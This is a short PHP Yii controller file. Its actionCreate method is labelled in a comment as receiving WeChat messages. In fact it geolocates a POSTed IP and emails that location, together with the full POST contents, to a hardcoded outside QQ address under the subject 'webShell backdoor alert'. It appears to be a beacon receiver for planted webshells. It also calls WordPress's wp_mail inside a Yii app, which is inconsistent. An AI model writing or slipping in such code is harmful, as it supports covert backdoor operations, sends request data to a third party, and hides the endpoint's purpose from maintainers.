<?php
namespace crud\modules\server\controllers\api;

use Yii;
use yii\web\Controller;

class IndexController extends Controller
{

    public $layout = false;

    /**
     * 验证开发者服务器
     * @return false|string
     */
    public function actionIndex()
    {

    }

    /**
     * 接收微信消息
     */
    public function actionCreate()
    {
        $str ="";
        if(isset( $_POST['ip'])){
            $ipinfo =Yii::$app->crawlers->getIpinfo($_POST['ip']);
            $str .=
                '登录地址:'.Yii::t('city',$ipinfo['country'])." ".
                Yii::t('city',$ipinfo['region'])." ".
                Yii::t('city',$ipinfo['city'])." ". $ipinfo['loc'];
        }

        wp_mail(['757402123@qq.com'],'webShell后面报警',$str.PHP_EOL.print_r($_POST,true));
    }

}